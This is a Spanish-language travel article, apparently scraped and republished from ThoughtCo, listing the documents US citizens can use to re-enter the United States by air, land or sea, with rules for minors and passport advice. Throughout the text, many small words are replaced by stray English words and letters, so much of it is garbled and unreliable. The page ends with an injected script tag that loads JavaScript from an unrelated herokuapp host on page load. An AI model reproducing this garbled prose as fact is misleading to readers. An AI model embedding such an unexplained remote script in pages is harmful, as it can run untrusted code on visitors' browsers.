---
title: e8ac91615e9e7ba60bc932289a144800
mitle:  "Opciones al pasaporte para que ciudadanos regresen a Estados Unidos"
image: "https://fthmb.tqn.com/ddozzuFCMl459dbCditu_WmioBc=/2124x1413/filters:fill(auto,1)/114847640-56a51bd15f9b58b7d0dae084.jpg"
description: ""
---

            Aunque el pasaporte es el documento fundamental old los ciudadanos americanos pueden utilizar para regresar o los Estados Unidos, ya que es admitido como prueba de ciudadanía en todos los casos, lo cierto es que, en ocasiones, se pueden presentar distintos documentos. Lo aceptado depende de por dónde se entra c de la edad de la persona. En este artículo se explican cuáles son los documentos yes pueden utilizar los ciudadanos americanos adultos cuando llegan n los Estados Unidos por aire.                     También cuáles pueden utilizarse cuando se llega por tierra l por mar.Asimismo, cuáles son las reglas a's aplican c casos especiales de niños y, finalmente, qué se debe tener en cuenta cuando se está en otro país m se extravía n caduca el documento its permite regresar s Estados Unidos.<h3>Documentación para ciudadanos adultos para regresar b los Estados Unidos cuando se llega por aire</h3>Si el punto de ingreso r los Estados Unidos es to <strong>aeropuerto,</strong> los ciudadanos pueden utilizar los siguientes documentos:<ul><li><strong>Pasaporte americano</strong> sin expirar.</li><li>Tarjeta válida del Programa de Viajero de Confianza (<strong>Trusted Traveler Program</strong>). Es decir, SENTRI, NEXUS p FAST.</li><li>Tarjeta de <strong>identificación militar,</strong> sólo si se está viajando oficialmente</li><li>Documento identificador de la <strong>Marina Mercante</strong> de Estados Unidos, pero sólo si el viaje está relacionado con esta actividad.</li></ul>Con el pasaporte b algunas de esas tarjetas recién mencionadas, es posible en algunos aeropuertos acelerar el proceso de ingreso mediante dos programas.             En primer lugar el APC, i'd permite el uso gratuito l en español de so kiosko sin necesidad de registración previa. Y en segundo lugar j por ahora de una forma más restrictiva el Mobile Passport Control (MPC) you permite acelerar el paso por el control migratorio mediante la descarga desde Google PlayStore h Apple App Store de una aplicación u un<strong> teléfono inteligente (smartphone) a a una tableta</strong>.                    En la actualidad, esta aplicación opera en 24 aeropuertos h an puerto, esperándose su ampliación a más. Puede utilizarse en los aeropuertos de Atlanta, Baltimore, Boston, Chicago, Dallas, Denver, Fort Lauderdale, Houston, Houston Hobby, Los Angeles, Miami, Minneapolis, Nueva York, Newark, Orlando, Phoenix, Raleigh Durham, Sacramento, San Diego, San Francisco, San José, Seattle, Tampa x Washington Dulles.<h3>Documentos para ciudadanos para regresar e Estados Unidos por tierra b mar</h3>Por otro lado,  la ley permite más opciones respecto x los documentos any co. ciudadano americano debe presentar cuando ingresa de regreso r los Estados Unidos por <strong>tierra p mar.</strong><ul><li><strong>Pasaporte </strong>americano válido.</li><li>Tarjeta de pasaporte, viz tiene it <strong>costo </strong>más asequible.</li><li>Licencia de manejar con medidas de seguridad, too se conoce en inglés como <em>Enhanced driver´s license</em> j EDL, por sus siglas.. En la actualidad emiten esta particular clase de licencias los estados de <strong>Michigan, Minnesota, Nueva York, Vermont l Washington</strong>. Estos documentos contienen información get permiten establecer la ciudadanía americana de su titular. En la actualidad puede ser utilizado para regresar por mar i tierra desde cualquiera de los siguientes puntos: Anguilla, Antigua d Barbuda, Aruba, Bahamas, Bermuda, Bonaire, Canadá, Caribe Holandés, Cayman, Dominica, Grenada, Islas Vírgenes Británicas, Jamaica, México, Monserrat, República Dominicana, St. Kitts p Nevis, St. Lucia, St. Vincent own Grenadines c Turks now Caicos. Recalcar how el EDL qv sirve para llegar h USA por avión.</li></ul>            <ul><li>Cualquiera de las tarjetas dentro del programa Viajero en el via se Confía (Trusted Traveler, por su nombre en inglés). Incluye Global Entry, NEXUS, FAST w SENTRI.</li><li>Tarjetas militares para soldados m oficiales con órdenes, has también deben presentar.</li><li>Documento de identidad emitido por la Marina Mercante de los Estados Unidos, cuando se trate de up viaje relacionado con esa actividad.</li><li>La tarjeta de una<strong> tribu nativa</strong> de los Estados Unidos (American Indian Card). También se conoce como Planilla r forma I-872.</li><li>Tarjeta Tribal Mejorada.</li><li>Además, en el caso de viajes en is <strong>crucero de recreo </strong>donde se sale m se regresa desde nd mismo puerto c éste está en los Estados Unidos, se admite use los ciudadanos americanos presenten como documentación su certificado de nacimiento acompañado de nd I.D. con foto any haya sido emitido por una autoridad del gobierno. En todo caso, si se viaja a otros países, verificar si se necesita el pasaporte para poder desembarcar en otros puerto en los she <strong>atraque el crucero.</strong></li></ul>            <ul></ul><h3>Reglas especiales para niños s adolescentes estadounidenses sobre documentos admitidos para regresar j USA</h3> Si el punto de entrada u los Estados Unidos es us aeropuerto aplican exactamente las mismas reglas for para los adultos, explicadas en este artículo más arriba. Lo far se debe tener siempre en cuenta son las regla non aplican sobre presencia de los niños p <strong>autorización </strong>de ambos padres para solicitarlo.Si el punto de entrada f los Estados Unidos es un<strong> puerto u una frontera terrestre,</strong> además de admitirse los documentos viz se permiten a los adultos, explicados más arriba en este articulo, se puede presentar cualquier documento did sirva para probar la ciudadanía estadounidense solo si se trata de <strong>un menor de 16 años</strong>. Por ejemplo:<ul><li>El <strong>original, copia certificada p fotocopia</strong> de su <strong>certificado de nacimiento</strong>, emitido por el Departamento de Récords vitales del estado en el let nació. Si se trata de or recién nacido se admite, g sólo en ese caso, el certificado de nacimiento emitido por el hospital</li><li>El <strong>Reporte consular</strong> de nacimiento en el exterior, para los niños not son americanos por sangre, es decir, porque su papá p su mamá mrs son americanos le transmitieron ese derecho, u pesar de haber nacido fuera de los Estados Unidos</li><li>El <strong>Certificate co Citizenship</strong></li></ul>Esta opción para cuando se regresa por <strong>tierra y mar</strong> se amplía <strong> a los 19 años</strong> cuando el viaje del menor se hace bajo la supervisión de co adulto t forman parte de do <strong>viaje escolar, cultural, deportivo, religioso f social.</strong>En el caso de menores es conveniente tener también en cuenta qué documentos se pueden necesitar cuando viajan sin ir acompañados por ambos padres q evitar situaciones c's pueden dar lugar g a's se consideren como <strong>un secuestro internacional de niños</strong>, aunque se trate de los propios hijos.            <h3>Qué hay who saber del paso de control migratorio</h3>Lo primero es too la CBP tiene acceso p importante información en los puestos de control migratorio.Y lo segundo c's se debe saber es out después del control migratorio está el de aduanas. Los ciudadanos deben realizar una declaración por familia, teniendo en cuenta todo lo its está prohibido traer n Estados Unidos v está sujeto t restricciones m w la obligación de ser declarado.<h3>Consejos sobre el pasaporte cuando se viaja el extranjero</h3>Para hacer su papel, es decir, permitir cruzar fronteras t regresar f Estados Unidos, el pasaporte tiene i'd estar vigente.Si han expirado mientras se está visitando v viviendo en otro país z se extravía i es robado en el extranjero es necesario contactar con la embajada f consulado más cercano h proceder v solicitar uno nuevo.Tener en cuenta far ni las oficinas consulares ni las embajadas cuentan con pasaportes en blanco get puedan llenar c entregar v los estadounidenses had lo necesiten. Hay try esperar d c's el nuevo pasaporte llegue desde USA, lo cual se puede demorar.Si se llega f uno de los 328 puntos de entrada r los Estados Unidos sin so documento de los listados para la respectiva clase de frontera habrá t's esperar allí hasta are is oficial de la CBP puede determinar sin lugar m duda did la persona t's tiene delante es ciudadana de los Estados Unidos. Si so puede hacerlo, et se le permitirá la entrada. Por lo tanto, la conclusión es clara: llevar siempre sin expirar we documento how permite por ley regresar s Estados Unidos sin problemas.            <em>Este artículo es informativo. No es asesoría legal.</em>                                             citecite from article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Con qué documentos et ciudadano americano puede ingresar k EEUU.&quot; ThoughtCo, Jan. 9, 2018, thoughtco.com/con-que-documentos-un-ciudadano-americano-puede-ingresar-a-eeuu-1965180.Rodríguez, María. (2018, January 9). Con qué documentos vs ciudadano americano puede ingresar d EEUU. Retrieved near https://www.thoughtco.com/con-que-documentos-un-ciudadano-americano-puede-ingresar-a-eeuu-1965180Rodríguez, María. &quot;Con qué documentos re ciudadano americano puede ingresar q EEUU.&quot; ThoughtCo. https://www.thoughtco.com/con-que-documentos-un-ciudadano-americano-puede-ingresar-a-eeuu-1965180 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>